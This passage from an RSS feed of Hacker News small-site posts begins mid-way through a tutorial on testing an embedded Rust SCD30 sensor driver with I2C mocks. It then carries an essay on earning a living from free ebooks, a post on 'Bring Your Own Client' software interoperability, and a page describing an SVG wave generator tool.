The <a href="https://www.sensirion.com/fileadmin/user_upload/customers/sensirion/Dokumente/9.5_CO2/Sensirion_CO2_Sensors_SCD30_Interface_Description.pdf">SCD30 Interface Specification (v1.0)</a> states (in section 1.4.9) that querying the firmware version involves these 2 I<sup>2</sup>C transactions:</p>

<ul>
  <li>A write transaction. Header: <code>0xC2</code>, bytes: <code>[0xD1, 0x00]</code></li>
  <li>A read transaction. Header: <code>0xC3</code>, bytes: <code>[0x03, 0x42, 0xF3]</code></li>
</ul>

<p>For those unfamiliar with I<sup>2</sup>C, in a <em>write</em> transaction the data flows from the <em>host</em> to the <em>device</em> and in a <em>read</em> transaction the data flows the other way.
In our case, the <em>host</em> is going to be the machine running the <code>Scd30</code> driver, e.g. a microcontroller, and the <em>device</em> is going to be the SCD30 sensor.</p>

<p>In I<sup>2</sup>C, a host can communicate with multiple devices connected to the same bus (electrical interface).
To differentiate one device from another each one has a different <em>address</em>.
An I<sup>2</sup>C transaction (in either direction) starts with a header.
The lower bit (bit 0) of this header indicates the direction: read (<code>1</code>) or write (<code>0</code>) transaction.
The upper 7 bits of the header are the I<sup>2</sup>C device address.
If we right-shift either of these headers (<code>0xC2</code> or <code>0xC3</code>) by one bit (<code>&gt;&gt; 1</code>) we get the I<sup>2</sup>C address of the SCD30 sensor: <code>0x61</code>.</p>

<p>The SCD30 response in the read transaction contains 3 bytes.
The first two bytes are the firmware version: the first byte is the major component; the second one is the minor component.
The third byte in the response is a checksum (CRC) of the first two bytes.
The firmware version of the SCD30 is always <code>3.66</code>, in <code>MAJOR.MINOR</code> format, according to the Interface Specification (v1.0) document.</p>

<p>Now let's see how to use the mock to test this functionality.</p>

<div><pre><code><span>// this code lives inside a `tests` module</span>

<span>use</span> <span>embedded_hal_mock</span><span>::</span><span>i2c</span><span>;</span>
<span>use</span> <span>super</span><span>::{</span><span>Error</span><span>,</span> <span>Scd30</span><span>};</span>

<span>#[test]</span>
<span>fn</span> <span>firmware_version</span><span>()</span> <span>{</span>
    <span>let</span> <span>expectations</span> <span>=</span> <span>vec!</span><span>[</span>
        <span>i2c</span><span>::</span><span>Transaction</span><span>::</span><span>write</span><span>(</span><span>0x61</span><span>,</span> <span>vec!</span><span>[</span><span>0xD1</span><span>,</span> <span>0x00</span><span>]),</span>
        <span>i2c</span><span>::</span><span>Transaction</span><span>::</span><span>read</span><span>(</span><span>0x61</span><span>,</span> <span>vec!</span><span>[</span><span>0x03</span><span>,</span> <span>0x42</span><span>,</span> <span>0xF3</span><span>]),</span>
    <span>];</span>
    <span>let</span> <span>mock</span> <span>=</span> <span>i2c</span><span>::</span><span>Mock</span><span>::</span><span>new</span><span>(</span><span>&amp;</span><span>expectations</span><span>);</span>

    <span>let</span> <span>mut</span> <span>scd30</span> <span>=</span> <span>Scd30</span><span>::</span><span>init</span><span>(</span><span>mock</span><span>);</span>
    <span>let</span> <span>version</span> <span>=</span> <span>scd30</span><span>.get_firmware_version</span><span>()</span><span>.unwrap</span><span>();</span>
    <span>assert_eq!</span><span>([</span><span>3</span><span>,</span> <span>66</span><span>],</span> <span>version</span><span>);</span>

    <span>let</span> <span>mut</span> <span>mock</span> <span>=</span> <span>scd30</span><span>.destroy</span><span>();</span>
    <span>mock</span><span>.done</span><span>();</span> <span>// verify expectations</span>
<span>}</span>
</code></pre></div>
<p>To create the I<sup>2</sup>C <code>Mock</code> we need to pass in some <em>expectations</em>.
These <em>expectations</em> are the I<sup>2</sup>C transactions expected by the mock.
We'll only test the <code>get_firmware_version</code> function here so only 2 transactions are expected.</p>

<p>Note that first argument of the <code>Transaction</code> constructors is the SCD30 I<sup>2</sup>C device address, <em>not</em> the header of the transaction.</p>

<p>Once we have an I<sup>2</sup>C mock we can instantiate the <code>Scd30</code> driver with it.
We'll then call the <code>get_firmware_version</code> method on the driver and assert that it returns version <code>3.66</code>.</p>

<p>Once we are done using the mock we need to call its <code>done</code> method.
This method verifies that all the expectations were used; if they were not, the method panics which fails the test.
The <code>i2c::Mock</code> will also panic if you try to perform a transaction not listed in the set of expectations it was constructed with.</p>

<p>If you <code>cargo test</code> your crate and correctly implement the <code>get_firmware_version</code> method then the above test should pass!</p>

<h3 id="failure-modes">Failure modes</h3>

<p>The cool thing about using a mock is that you can simulate failures that would be hard to produce with real hardware.
For instance, it's unlikely you'll be able to make the SCD30 sensor report a bad checksum in its responses and it would be hard and costly to inject interference in the I<sup>2</sup>C bus to flip some bits in the sensor response.
But with a mock you can easily simulate these errors and verify that your driver crate behaves correctly in these scenarios.
Let's see how to do that for the <code>get_firmware_version</code> API.</p>

<div><pre><code><span>#</span><span>[</span><span>test</span><span>]</span>
<span>fn</span> <span>firmware_version_bad_crc</span><span>()</span> <span>{</span>
    <span>let</span> <span>expectations</span> <span>=</span> <span>vec!</span><span>[</span>
        <span>Transaction</span><span>::</span><span>write</span><span>(</span><span>0x61</span><span>,</span> <span>vec!</span><span>[</span><span>0xD1</span><span>,</span> <span>0x00</span><span>]),</span>
        <span>// NOTE negated CRC byte in the response!</span>
        <span>Transaction</span><span>::</span><span>read</span><span>(</span><span>0x61</span><span>,</span> <span>vec!</span><span>[</span><span>0x03</span><span>,</span> <span>0x42</span><span>,</span> <span>!</span><span>0xF3</span><span>]),</span>
    <span>];</span>
    <span>let</span> <span>mock</span> <span>=</span> <span>i2c</span><span>::</span><span>Mock</span><span>::</span><span>new</span><span>(</span><span>&amp;</span><span>expectations</span><span>);</span>

    <span>let</span> <span>mut</span> <span>scd30</span> <span>=</span> <span>Scd30</span><span>::</span><span>init</span><span>(</span><span>mock</span><span>);</span>
    <span>let</span> <span>res</span> <span>=</span> <span>scd30</span><span>.get_firmware_version</span><span>();</span>
    <span>assert_eq!</span><span>(</span><span>Err</span><span>(</span><span>Error</span><span>::</span><span>InvalidCrc</span><span>),</span> <span>res</span><span>);</span>

    <span>scd30</span><span>.destroy</span><span>()</span><span>.done</span><span>();</span> <span>// verify expectations</span>
<span>}</span>
</code></pre></div>
<p>Here we have a test that's similar to the previous one but includes a fake error in the SCD30 response: the third byte, the CRC, is negated, meaning all its bits are flipped.
This should be detected as an error by our <code>Scd30</code> driver because the checksum is invalid so this time we assert that <code>get_firmware_version</code> returns an <code>InvalidCrc</code> error.</p>

<h3 id="dont-rely-solely-on-mocks">Don't rely solely on mocks</h3>

<p>The fact that you can use mocks to test the driver crate code does not mean that should exclusively use mocks to test your code.
Wherever possible you should extract the parts of your code base that are <em>pure</em>, meaning they do not perform side effects like I/O. These parts can then easily be tested using stock testing functionality - without the overhead of using mocks.</p>

<p>A great example of this in the SCD30 driver crate is the checksum functionality.
All responses from the sensor include a CRC8 checksum; the Interface Specification document describes how to compute it and includes some examples.
In this case, you can refactor the CRC computation into a helper function that's used in functions that involve I<sup>2</sup>C communication.
The helper function is pure: it takes some bytes and returns one byte, so it can be tested in isolation without mocks.</p>

<div><pre><code><span>fn</span> <span>compute_crc</span><span>(</span><span>bytes</span><span>:</span> <span>&amp;</span><span>[</span><span>u8</span><span>])</span> <span>-&gt;</span> <span>u8</span> <span>{</span>
    <span>// ..</span>
<span>}</span>

<span>#[cfg(test)]</span>
<span>mod</span> <span>tests</span> <span>{</span>
    <span>#[test]</span>
    <span>fn</span> <span>crc</span><span>()</span> <span>{</span>
        <span>// example from the Interface Specfication document</span>
        <span>assert_eq!</span><span>(</span><span>super</span><span>::</span><span>compute_crc</span><span>(</span><span>&amp;</span><span>[</span><span>0xBE</span><span>,</span> <span>0xEF</span><span>]),</span> <span>0x92</span><span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div>
<h2 id="target-testing-with-defmt-test">Target testing with <code>defmt-test</code></h2>

<p>Now it's time to confront the implementation, so far only tested on the host, with reality.
The idea is to instantiate the <code>Scd30</code> drivers with one of the existing HAL crates, instead of a mock, and test that.</p>

<p>This part requires actual hardware: in this example, in addition to the SCD30 sensor we'll use the nRF52840 …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ferrous-systems.com/blog/test-driver-crate/">https://ferrous-systems.com/blog/test-driver-crate/</a></em></p>]]>
            </description>
            <link>https://ferrous-systems.com/blog/test-driver-crate/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26356116</guid>
            <pubDate>Fri, 05 Mar 2021 12:33:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Paying my bills with 'free' ebooks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26356095">thread link</a>) | @asicsp
<br/>
March 5, 2021 | https://learnbyexample.github.io/my-book-writing-experience/ | <a href="https://web.archive.org/web/*/https://learnbyexample.github.io/my-book-writing-experience/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    

    <div>
      <p><strong>TL;DR</strong>: Small victories are more precious when you have nothing. Instead of burning through my savings, I'm now adding to it. The relief is priceless.</p>
<h2 id="it-is-worth-it-for-me">It is worth it (for me)<a href="#it-is-worth-it-for-me" aria-label="Anchor link for: it-is-worth-it-for-me">🔗</a></h2>
<p>The section title is my response to this article <a href="https://martin.kleppmann.com/2020/09/29/is-book-writing-worth-it.html">Writing a book: is it worth it?</a> that I saw on <a href="https://news.ycombinator.com/item?id=24628549">Hacker News</a>.</p>
<p>For my unique circumstances, the decision to write ebooks has brought me financial stability, improved my mental health and gives me a sense of satisfaction. This could've come from any of my previous attempts to earn money, but ebooks is what worked out for me.</p>
<p><img src="https://learnbyexample.github.io/images/books/book_writing.jpg" alt="Book writing"></p>
<p><i>Photo by <a href="https://unsplash.com/@bramnaus">Bram Naus</a> on <a href="https://unsplash.com/photos/n8Qb1ZAkK88">Unsplash</a></i></p>
<br>
<h2 id="how-it-all-started">How it all started?<a href="#how-it-all-started" aria-label="Anchor link for: how-it-all-started">🔗</a></h2>
<p>I left my job in 2014 for various reasons. I didn't have any plans for the future, just knew that I couldn't work as an employee any more.</p>
<p>After enjoying my break, I had to try something to start earning again. I wrote an android gaming app, fantasized earning loads of money with an awesome work planner/communicator software that never left my imaginations, tried a small stint with <a href="https://krishworks.com/">a team making an educational app</a>, etc. I failed due to various reasons — didn't try hard enough, quit early, didn't fit my skills, wasn't good at design/marketing and so on. The educational app for example went on to become a success. Or perhaps, having saved enough to live out a few years without working meant I wasn't under enough pressure to earn.</p>
<p>Among these failures, college workshops was the sole bread giver (and long way from supporting my living costs). My bachelor's degree was in electronics and communications and I had worked in a semiconductor company. So I knew enough to teach students pursuing similar courses the basics for Linux command line, Vim, Perl, Bash scripting, etc. As reference materials, I used to provide ppt slides (when I still had a job). Now that I had loads of free time, I started expanding my knowledge. Came to know about sites like Stackoverflow/Stackexchange/Reddit/etc. With newer and better materials to learn from, I created PDFs (using LibreOffice, which was pretty much the only option I knew about).</p>
<p>Another loss maker was getting a domain/host to share these learning materials. Web development was too much for me and the (ugly) site didn't get any love. In hindsight, one of the better turning points was learning about GitHub in 2016. I loved markdown's nice output with syntax highlighting (and realized I was using it poorly in Reddit) and GitHub's social aspect (stars, issues, etc) — plus I can use Vim! I manually converted my materials from LibreOffice to markdown (again, I didn't know that tools like <code>pandoc</code> could've helped me). Just like any other skill, I was learning and getting better with every iteration. That was the year I learned Python (thanks to <a href="https://inventwithpython.com/"><strong>Al Sweigart</strong></a>'s free coupon for "Automate the Boring Stuff with Python" video course) and started conducting workshops for Python instead of Perl.</p>
<p>Being active on Stackoverflow and Reddit, I finally became proficient at CLI one-liners (late by 8 years, since it would have significantly helped in my role as a design and test engineer). I came across articles/books on regular expressions and one-liners. I thought — I can do that too, plus I was really liking them. Thus began my epic <a href="https://github.com/learnbyexample/Command-line-text-processing">Command Line Text Processing</a> repo, another big turning point in my journey as an author.</p>
<br>
<h2 id="encouraging-signs">Encouraging signs<a href="#encouraging-signs" aria-label="Anchor link for: encouraging-signs">🔗</a></h2>
<p>Over the course of ten months, I managed to complete the holy trinity of <code>grep</code>, <code>sed</code> and <code>awk</code> one-liners. I promoted these tutorials on Reddit, Google+, LinkedIn and other social sites I knew at that time. The repo got hundreds of stars and more importantly, I got critical feedback. I was ecstatic, even if I was continuing to burn through my savings.</p>
<p>Then, I got to know about Hacker News (I think it was someone bragging about reaching front page). It took me a while to get used to Reddit, and HN was similarly alien to me. I posted a few links as a test and then I was <a href="https://news.ycombinator.com/item?id=15549318">brave enough to submit</a> my <code>awk</code> one-liners post. I was refreshing HN anxiously for about half an hour or so. It got one vote and then other submissions pushed it away from new posts tab. Disappointed, I moved on. After sometime, I was checking traffic on my GitHub repo as usual, a habit I had picked up (all kinds of points, karma, likes, etc were so enticing). I noticed a HUGE spike in traffic and star count, the likes of which I had never seen before/since. The last time I had felt that proud of my work was during my job. This comment made the most impression on me:</p>
<blockquote>
<p>These are the best stories on HN and why i subscribed here in the first place. I have often seen awk used so many times on SO but I've always put it up for something later to learn. Finally today I have some basic understanding of awk and this is really great stuff! I did get by with Perl but this is definitely more handy and the example approach to teaching it makes is super easy to understand!</p>
</blockquote>
<p>After the euphoria had died down (about a week I guess), I was thinking about all the various kinds of posts I could make. And I was thinking how to use the repo popularity to bring in money. Long story short, I ended up adding donate buttons to my repos. This was before GitHub sponsors was announced. I wanted my materials to be freely available, so I wasn't even thinking about creating paid only options. Despite adding more tutorials, getting featured in <a href="https://rubyweekly.com/issues/389">rubyweekly</a> and other newsletters, social sites, etc, all I got was a single recurring donation (which ended prematurely when that platform switched payment set up).</p>
<p>Another turning point came when a friend of mine was authoring a book and referred me for the reviewer role. Around that time, I had been converting <a href="https://github.com/AllenDowney/ThinkPython2">Think Python</a> to <a href="https://github.com/learnbyexample/ThinkRubyBuild">Think Ruby</a> and simultaneously working on a separate Ruby tutorial. During the book review process, I was given a list of topics and asked if I was interested in writing a book (they were impressed by my existing repos). The topics were either beyond my knowledge or out of scope, and they weren't interested in the repos I had already put up.</p>
<p>My friends were always suggesting me to write a book and my reply consistently had been that I wasn't good enough to write one (the imposter syndrome hasn't left me even now). The book review experience, existing repos, my tryst with Think Ruby, dwindling savings, etc changed my mindset enough to try. By then I was already familiar with Leanpub, so I knew self-publishing was an option. I picked a niche topic (<a href="https://learnbyexample.github.io/Ruby_Regexp/">Ruby Regexp</a>), <a href="https://learnbyexample.github.io/customizing-pandoc/">learned enough <code>pandoc</code> to produce a PDF</a> and published it even before the book review ended. It helped that I already had material as part of the Ruby tutorial I was working on. I still had to work a lot, since tutorial description was all bullet points.</p>
<p>I got only a few sales, but I had landed another review (video course for the same book) and was getting paid. So, I converted 'Ruby Regexp' to <a href="https://learnbyexample.github.io/py_regular_expressions/">Python re(gex)?</a>. I made it free for a few days and posted on Reddit, HN and other social sites. HN submission didn't get any traction, but fortunately Reddit was a big hit — thousands of free downloads and a few paid ones enough to cover 2 months of my expenses. I should mention now that I live alone, in outskirts of an Indian city, and my modest lifestyle costs about $150 per month. What works for me won't necessarily suit others.</p>
<br>
<h2 id="a-dip-followed-by-sustainable-momentum">A dip followed by sustainable momentum<a href="#a-dip-followed-by-sustainable-momentum" aria-label="Anchor link for: a-dip-followed-by-sustainable-momentum">🔗</a></h2>
<p>Encouraged by the second release, I changed my focus from updating my GitHub repos to writing books. All those repos were now a fodder for book conversion. I picked up <code>grep</code> first and included <code>ripgrep</code> as well to keep it inline with the trend. Got decent sales from <em>free</em> promotions. HN submission tanked at first, but got good attention when I posted again after a revision. Then I published a new version of 'Python re(gex)?' with significant changes and this HN submission got good views too. But note that these HN hits weren't anywhere close to what my <code>awk</code> one-liners post had received.</p>
<p>Writing <code>sed</code> took a lot out of me. Probably I was getting jaded again, juggling between workshops and ebooks. Then I had a medical issue. I didn't even try promoting the <code>sed</code> book on HN. I managed to learn enough JS to write <a href="https://github.com/learnbyexample/learn_js_regexp">JavaScript regexp</a>. Wasn't anywhere close to what I got from the Python book.</p>
<p><img src="https://learnbyexample.github.io/images/books/roller_coaster.jpg" alt="Roller Coaster"></p>
<p><i>Photo by <a href="https://unsplash.com/@davidtrana">David Traña</a> on <a href="https://unsplash.com/photos/mmdchg5UPtQ">Unsplash</a></i></p>
<p>So, despite reasonable reception during free promotions, my ebooks weren't still good enough to consistently pay my bills. Combined with workshops I was just about making my ends meet. I was losing interest and the medical issue was continuing. Still, without anything else to do, I finally started <code>awk</code> book. Things started getting better for a few months and then the pandemic hit.</p>
<p>Given the recent medical scare, pandemic fears and the trend of giveaways, I decided to open source my book contents. And, I made all my ebooks free to download indefinitely. Made a single bundle of all the 5 books I had published until then to make it easier to download in one shot. The reception was better than expected. Shortly after (March last week), I published the <code>awk</code> book early by cutting corners like excluding exercises. All books bundle now had 6 entries. Again, the reception was much better than expected. I hadn't made so many paid sales during a month ever before.</p>
<p>Encouraged by the success, I made another important decision. Instead of starting another book, I took up the task of updating all my books. I alloted a month or two for this task, but it took me more than 4 months in the end. It wasn't that I had lot of new features to add. The feedback I had received over the past year and my own improving writing skills meant that I just couldn't help updating the books to the best of my abilities. Somehow, lockdown and fear of the pandemic ended up improving my workflow.</p>
<p>Workshops weren't going to come my way anytime soon, but ebook sales for about 6 months averaged $200+ per month. For the first time since leaving my job, I was saving money!!! During this period all my books were free to download, in addition to the markdown source being available from …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://learnbyexample.github.io/my-book-writing-experience/">https://learnbyexample.github.io/my-book-writing-experience/</a></em></p>]]>
            </description>
            <link>https://learnbyexample.github.io/my-book-writing-experience/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26356095</guid>
            <pubDate>Fri, 05 Mar 2021 12:30:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bring Your Own Client]]>
            </title>
            <description>
<![CDATA[
Score 522 | Comments 243 (<a href="https://news.ycombinator.com/item?id=26355779">thread link</a>) | @pcr910303
<br/>
March 5, 2021 | https://www.geoffreylitt.com/2021/03/05/bring-your-own-client.html | <a href="https://web.archive.org/web/*/https://www.geoffreylitt.com/2021/03/05/bring-your-own-client.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Just a little note about the main problem I'm pondering these days...</p><div><p>It’s delightful to have the freedom to <strong>Bring Your Own Client (BYOC)</strong>: to choose your favorite application to interact with some data.</p>

<p>For example, I can program with Sublime Text, while my teammate uses vim, and we don’t need to fight to the death to pick one editor between us. There are dozens of text editors to choose from, and no lock-in from proprietary file formats.</p>

<p>Contrast this with Google Docs: in order to live collaborate with each other, we all need to use the same editor. For someone who spends their whole working day in Google Docs, this can be a serious limitation. I personally hate doing substantial writing in Google Docs.</p>

<p>In cloud apps, the live collaboration logic is usually coupled to a specific editor; even if Google wanted to expose an API for editing Google Docs in third-party editors, it would probably be very challenging. The situation is nicer with text editors and git, because editing is decoupled from collaboration logic. Our team only needs to agree on a version control solution, which exposes a simple API (local text files) that many editors can interact with.</p>

<p>To be fair, local vs cloud isn’t the only factor here—even in local software, collaborators are often forced to converge on a single proprietary client (Microsoft Office, Adobe suite); conversely, a cloud service can support a third-party client ecosystem with the right APIs and attitude. Still, cloud apps exacerbate the problem. With local files, there’s some default openness built in; even proprietary file formats can be reverse-engineered. With cloud apps, the default is a single official client, unless the service actively exposes an API (and doesn’t shut it down—looking at you, Twitter).</p>

<p>It seems like local-first software is a good foundation for promoting Bring Your Own Client more broadly. What would it look like to have a thriving ecosystem of third-party clients for Google Docs style word processing, which can all interoperate with each other, even supporting realtime collaboration?</p>

<h2 id="concrete-examples">Concrete examples</h2>

<p>Some successful existing examples of client ecosystems built around open standards:</p>

<ul>
<li>text editors / IDE</li>
<li>RSS readers</li>
<li>email clients</li>
<li>web browsers</li>
</ul>

<p>Places where I want to have BYOC:</p>

<ul>
<li>Google Docs. I wish I could write this very doc in my preferred editor, locally, but have also support for inline comments and live collaboration. Might it be possible to build a VSCode extension that edits Google Docs live? (Tricky, because Google doesn’t have a nice API to integrate with, but maybe doable)</li>
<li>Google Slides</li>
<li>Figma</li>
<li>Notion</li>
<li>Trello / Asana / shared todo lists</li>
<li>multiplayer code editor: live collaboration as in repl.it</li>
</ul>

<h2 id="finer-granularity">Finer granularity</h2>

<p>Today we generally think about BYOC at the “app” level. But can we go finer-grained than that, picking individual interface elements?</p>

<p>Instead of needing to pick a single email client, can I compose my favorite email client out of an inbox, a compose window, and a spam filter?</p>

<h2 id="problems-questions">Problems / questions</h2>

<ul>
<li><strong>Schema compatibility</strong>: do all the editors need to agree on a single rigidly specified format? If there are reconcilable differences between formats, can we build “live converters” that convert between them on every change? (Essentially, imagine collaborating between Pages and Microsoft Word, running a file export in both directions on every keystroke from either app) This problem is closely related to the problem of schema versioning within a single editor, but BYOC can complicate things much further.</li>
<li><strong>Preserving intent</strong>: the decoupling of git + text editors has a downside: the text format fails to capture the intent of edits, so git can’t be very smart about merging conflicts. Is this something fundamental to decoupling editors from collaboration? Or are there ways to design APIs that preserve intent better, while also supporting an open client ecosystem? (It seems like deciding on how you store your data in a CRDT is the key question here?)</li>
<li><strong>Additional editor-specific metadata</strong>: Some editors need to store additional data that isn’t part of the “core data model.” Eg, Sublime Text stores my <code>.sublime-workspace</code> file alongside the code source. How does this work smoothly without polluting the data being used by other editors?</li>
<li><strong>Code distribution</strong>: Traditionally code distribution happens through centralized means, but could code be distributed in a decentralized way alongside documents? If we’re collaborating together in a doc, can I directly share a little editor widget/tool that I’m using, without needing to send you a Github link? This might be overcomplicating things / orthogonal to the general idea here… (This idea inspired by <a href="https://webstrates.net/">Webstrates</a>, linked below)</li>
<li><strong>Innovation</strong>: Unfortunately stable open formats can limit product innovation—eg, email clients are tied down by adherence to the email standard. Can we mitigate that effect? I think web browsers have struck a good balance between progress and openness, despite frustrations in both directions.</li>
</ul>

<h2 id="addendum-faq">Addendum: FAQ</h2>

<p><em>Edited 2020-03-05: This post unexpectedly got popular on HN. As I drink my morning coffee, I’ll briefly respond to a few themes from the comments here.</em></p>

<p><strong>Q: Don’t standards make it harder to innovate?</strong></p>

<p>A: Yes, that’s a major challenge. For example, email and IRC have lagged behind Slack and Reddit, because it’s hard to change standards. We discussed this problem a bit in the <a href="https://www.inkandswitch.com/cambria.html#mastodon-protocol-evolution">Cambria paper, re: Mastodon</a>.</p>

<p>I think the key is to aim for more flexible and extensible standards: a useful 80% compatibility, rather than a perfect 100%.</p>

<p>Of course, once you abandon an exact standard, it’s easy to rack up tons of complexity. (I think the Semantic Web struggled with this problem trying to provide schema flexibility.) So we also need better tools to make partial compatibility easy to reason about, for both developers and users.</p>

<p><strong>Q: Hmm. 80% compatibility sounds like kind of a buggy mess? Word and OpenOffice don’t interop very well.</strong></p>

<p>A: I think with the right foundational tech for helping devs build maximally compatible formats, we can avoid the worst problems of incorrect format conversions. In the Cambria paper we sketched <a href="https://www.inkandswitch.com/cambria.html#lenses-in-action">a few examples</a> of partial compatibility, where Cambria guaranteed type safety and helped us easily avoid bugs.</p>

<p>That does leave a substantial design problem, though: even if everything works correctly, what do you show the <em>user</em> when two pieces of software aren’t fully compatible? How do you tell a user that their actions might show up differently for collaborators using different apps? I’m thinking a lot about these questions…</p>

<p><strong>Q: Cloud business models are so entrenched. Can this actually happen without government intervention?</strong></p>

<p>A:  It’s true that business incentives are a major challenge. Maybe some form of government intervention could help, but ultimately it’ll be fighting a headwind unless users and devs are excited for the change.</p>

<p>I think the most sustainable way to make progress is to make BYOC the most convenient option, for the typical user and the typical developer. On the desktop, it’s convenient for a developer to work with the user’s existing filesystem. On the web today, there’s no user-controlled filesystem, so it’s usually easiest to just put the data in a database, and add a ticket to the backlog for someday building a public-facing API. How would that change if we had a convenient user-controlled place to put data?</p>

<p>See the <a href="https://www.inkandswitch.com/local-first.html">local-first software</a> article by Ink &amp; Switch for some ideas on how new data architectures can make the right thing the easy thing, for both users and devs.</p>

<h2 id="prior-art">Prior Art</h2>

<ul>
<li><a href="https://webstrates.net/">Webstrates</a> has some great demos of this philosophy. It uses a centralized server for the live sync.</li>
<li>Webstrates descends from Michel Beaudouin-Lafon’s work on <a href="https://youtu.be/ntaudUum06E?t=727">instrumental interfaces</a>—"polymorphic" tools that can operate in different applications. For example, a color picker that I can use in any app.</li>
<li>The <a href="https://solidproject.org/">SOLID</a> decentralized web project has some closely related ideas: <a href="https://ruben.verborgh.org/blog/2017/12/20/paradigm-shifts-for-the-decentralized-web/#apps-become-views">“apps become views”</a>, creating a competitive marketplace of clients decoupled from data silos. In turn it’s heavily inspired by ideas from the Semantic Web.</li>
<li><a href="https://mashable.com/2009/05/28/google-wave-guide/">Google Wave</a> had some related ideas… A platform for realtime collaboration, with a rich open <a href="https://youtu.be/v_UyVmITiYQ?t=4207">extension API</a> intended for people to build various collaboration clients on top of. Seems like the common wisdom on why it failed is that it was <a href="https://gizmodo.com/what-in-the-hell-was-google-wave-trying-to-be-anyway-1835038967">too complicated</a> and tried to do too much.</li>
<li><a href="https://braid.news/">Braid</a> is exploring ways to extend HTTP to support collaborative editing across diverse clients.</li>
</ul>



<ul>
<li>I believe one piece of the puzzle here is declarative schema mapping, for example the <a href="https://www.inkandswitch.com/cambria.html">Cambria</a> project I worked on recently.</li>
<li>Granular BYOC starts to look like <a href="https://www.geoffreylitt.com/2020/07/19/tools-over-apps-for-personal-notetaking.html">software as curation</a>: assembling software out of smaller “extensions”</li>
<li>Also relates to document-centric computing ideas like OpenDoc. Some <a href="https://twitter.com/geoffreylitt/status/1362779218241855494">recent notes</a> I took on why that failed…</li>
<li>Part of the solution may involve extracting and synchronizing data from cloud services without going through official APIs, as demonstrated in my <a href="https://www.geoffreylitt.com/wildcard">Wildcard</a> project.</li>
</ul>

<h2 id="im-working-on-this">I’m working on this!</h2>

<p>I’m currently pursuing a PhD at MIT doing research on this topic. Lots of challenges and open questions ahead, but I have some ideas for how to make progress. I’m particularly excited about clever ways to incrementally nudge us from the status quo to a BYOC world, rather than reinventing everything.</p>

<p>If you want to follow along with future updates, you can subscribe via the links below.</p>

<p>And if you have ideas about this topic or want to chat, feel free to <a href="mailto:gklitt@gmail.com">get in touch</a>.</p>

<h2 id="ps-idea-incubation">PS: idea incubation</h2>

<p>I actually wrote this note 10 months ago and had totally forgotten about it.</p>

<p>An hour ago, I randomly came across it and was quite amused. It includes some ideas which I <em>thought</em> I had started thinking about only recently. But it turns out they’ve been incubating in my mind for a long time. Funny how that works!</p>
</div></div>]]>
            </description>
            <link>https://www.geoffreylitt.com/2021/03/05/bring-your-own-client.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26355779</guid>
            <pubDate>Fri, 05 Mar 2021 11:47:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Free SVG Wave Generator]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26355584">thread link</a>) | @narekb
<br/>
March 5, 2021 | https://www.softr.io/tools/svg-wave-generator | <a href="https://web.archive.org/web/*/https://www.softr.io/tools/svg-wave-generator">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-appid="8f7af9fb-a550-425d-b327-48195c193a5f"><nav id="header"><div><!-- Logo --><p><a href="https://www.softr.io/"><img src="https://softr-prod.imgix.net/applications/8f7af9fb-a550-425d-b327-48195c193a5f/assets/9774cc17-156a-4cc2-99cc-ce21bcd4d459.svg" alt="Publish your designed things."></a></p><!-- mobile toggle --></div></nav><section id="custom-code1"></section><section id="feature-grid3"><div><!-- Header --><!-- Subheader --><div><p>A free design tool to create colorful, multilayer, random, unique, and organic-looking SVG waves.</p></div><div><div><h6>Customize</h6><p>Change the number of waves, complexity, height, colors and gradient  to create different types of organic SVG waves</p></div><div><h6>Randomize</h6><p>Press the randomize button until you find a SVG wave you like</p></div><div><h6>Download</h6><p>Get the wave as an SVG, PNG or copy the code directly into your clipboard</p></div></div></div></section><section id="cta2"></section><header id="hero1"><div><div><div><p>SVG Wave Generator is a free tool made by Softr for creating random wave-like shapes that you can use in your landing page designs, social media images, product feature showcase, and so on. If you are not proficient with professional design tools but think you might need something like that for your website or for some other purpose, you can use the tool to generate random waves in a few seconds and download them as .png or .svg. There’s also an option to switch between curvy and sharp-edged waves as well as add a gradient to make the waves look even cooler. In addition, you can combine multiple waves to produce a more complex image at once. The image on the right is an example of a shape generated with SVG Wave Generator. It uses sharp edges, gradients, and a combination of 4 wave shapes.</p></div><p><img src="https://softr-prod.imgix.net/applications/8f7af9fb-a550-425d-b327-48195c193a5f/assets/2c65eb38-1235-44d8-bc2a-ecb6d2ab4dd8.png" alt="Image alt"></p></div></div></header><header id="hero2"><div><div><p><img src="https://softr-prod.imgix.net/applications/8f7af9fb-a550-425d-b327-48195c193a5f/assets/c2c2d625-1d31-4b25-9ed9-9c8585a04a01.png" alt="Image alt"></p><div><p>Wave-like shapes are really commonplace in today’s web design. The image shows a few examples of wave usage in websites. As you can see, they can be used in mobile apps, as a landing page background, site navigation bar background, and so on. With SVG Wave Generator, you can create similar shapes in just a few seconds and apply them in your designs.</p></div></div></div></header><header id="hero3"><div><div><div><p>To show how it can be applied in real life, let’s consider an example using our no-code website and web app builder – Softr. In Softr, you have the option of uploading a custom background image to almost all the building blocks that are used to construct a web app or a website. The image shows one of our hero area layouts, where an .svg generated by the Wave Generator has been added as a background image.

Thus, generating designs for your site with SVG Wave Generator is really easy and fun. Go ahead and try it yourself!</p></div><p><img src="https://softr-prod.imgix.net/applications/8f7af9fb-a550-425d-b327-48195c193a5f/assets/983e6e1d-aaad-4841-b49f-97ccd62e105b.png" alt="Image alt"></p></div></div></header><section id="cta1"><div><div><div><h2>The website you are reading now is built on Softr.</h2><p>Want to create yours?</p></div></div></div></section></div></div>]]>
            </description>
            <link>https://www.softr.io/tools/svg-wave-generator</link>
            <guid isPermaLink="false">hacker-news-small-sites-26355584</guid>
